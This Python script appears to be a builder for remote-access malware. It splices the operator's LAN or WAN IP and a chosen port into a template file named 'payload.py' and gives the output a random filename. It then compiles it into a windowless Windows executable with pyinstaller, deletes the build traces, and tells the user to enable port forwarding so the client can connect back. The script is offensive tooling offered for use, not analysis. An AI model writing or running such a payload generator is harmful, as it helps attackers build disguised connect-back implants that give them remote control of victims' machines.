import random
import sys
from Machineip import gethost
from time import sleep
import threading
import os
## random string generation function
def ranSTR():
	randomstr = ''
	select = 'abcdefghijklmnopqrstuvwxyz'
	for i in range(10):
		a = random.choice(select)
		ranint = random.randint(1,2)
		if ranint == 1:
			a = a.upper()
		else:
			pass
		randomstr += a
	return randomstr

## this is just for appearance
def printsl(string):
	sys.stdout.write(string)
	sys.stdout.flush()

## pulling the template from the template file
with open('payload.py', 'r') as tf:
	template = tf.read()
	a = 105
	for i in range(10):
		pass
	tf.close()

template1 = template[0:105]
template2 = template[105:113]
template3 = template[113:791]
ip = ''
inp = input('is this for a LAN or a WAN? (LAN/WAN): ')
if inp == 'LAN':
	ip = gethost.getLAN()
elif inp == 'WAN':
	ip = gethost.getWAN()
else:
	exit()
port = input('enter the port you wish to use: ')

## forging the payload
payload = template1 + ip + template2 + f' {port}' + template3
text = 'forging client payload...'
for c in text:
	printsl(c)
	sleep(0.05)
filename = f'{ranSTR()}cli'
cfilename = f'{filename}.py'
with open(cfilename, 'a+') as cf:
	cf.write(payload)
	cf.close()
sleep(1)
text2 = 'converting to excecutable...'
print('')
for c in text2:
	printsl(c)
	sleep(0.05)
print('')
os.system(f'pyinstaller --onefile -w {cfilename}')
print('')
text3 = 'cleaning up...'
for c in text3:
	printsl(c)
	sleep(0.05)
os.system('RD /S build /Q')
target = 'DEL /F /A ' + filename + '.spec /Q'
target2 = 'DEL /F /A ' + filename + '.py /Q'
os.system(target)
os.system(target2)
os.system('RD /S __pycache__ /Q')
sleep(0.5)
print('')
print('payload is complete')
sleep(0.4)
printsl('refer to the dist directory for the payload')
text4 = '...'
for i in text4:
	printsl(i)
	sleep(0.1)
print('')
print('remember to enable port forwarding!!!')
input('')